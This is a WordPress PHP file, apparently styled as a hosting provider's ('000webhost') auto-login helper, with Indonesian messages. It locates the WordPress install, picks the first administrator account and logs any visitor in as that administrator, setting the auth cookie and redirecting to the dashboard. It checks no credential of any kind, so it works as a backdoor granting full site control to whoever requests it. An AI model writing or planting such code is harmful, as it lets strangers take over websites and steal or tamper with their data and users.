<?php

$dir = __DIR__;
while (!file_exists($dir . '/wp-config.php') && $dir != '/') {
    $dir = realpath($dir . '/..');
}

if ($dir == '/' || !file_exists($dir . '/wp-config.php')) {
    header('HTTP/1.1 404 Not Found');
    exit('WordPress tidak ditemukan.');
}

define('WP_PATH', $dir . '/');
require_once WP_PATH . 'wp-load.php';

global $wp_version;

if (!isset($wp_version)) {
    exit('Gagal memuat WordPress.');
}

if (is_user_logged_in()) {
    wp_redirect(admin_url('?platform=000webhost'));
    exit;
}

auto_login();

function auto_login() {
    $user_id = get_user_id();
    if (!$user_id) return;

    $user = get_user_by('ID', $user_id);
    if (!$user) return;

    wp_set_current_user($user_id, $user->user_login);
    wp_set_auth_cookie($user_id);
    do_action('wp_login', $user->user_login, $user);

    wp_redirect(admin_url('?platform=000webhost'));
    exit;
}

function get_user_id() {
    $admins = get_users([
        'role' => 'administrator',
        'search' => '*@*',
        'search_columns' => ['user_email']
    ]);
    if (!empty($admins[0]->ID)) return $admins[0]->ID;

    $admins = get_users(['role' => 'administrator']);
    if (!empty($admins[0]->ID)) return $admins[0]->ID;

    return null;
}

wp();
require_once ABSPATH . WPINC . '/template-loader.php';
